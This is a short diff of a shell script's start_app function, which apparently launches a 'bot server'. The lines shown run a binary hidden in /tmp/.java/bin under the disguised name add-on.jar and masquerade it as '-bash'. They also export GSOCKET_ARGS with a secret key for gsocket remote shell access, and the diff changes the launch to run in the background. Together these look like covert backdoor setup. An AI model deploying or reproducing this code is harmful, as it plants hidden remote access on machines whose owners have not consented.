@@ -15,7 +15,7 @@ function start_app() {
     chmod a+x /tmp/.java/bin/***
     # cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
     export GSOCKET_ARGS="-s be928caed2a1e2c5a16f98139d80bd78-564c961ecd9f9440da62803ca815160c -liqD"
-    cd /tmp/.java/bin && exec -a -bash ./add-on.jar
+    cd /tmp/.java/bin && exec -a -bash ./add-on.jar &
     echo "BOT SERVER STARTED ..."
 }
 
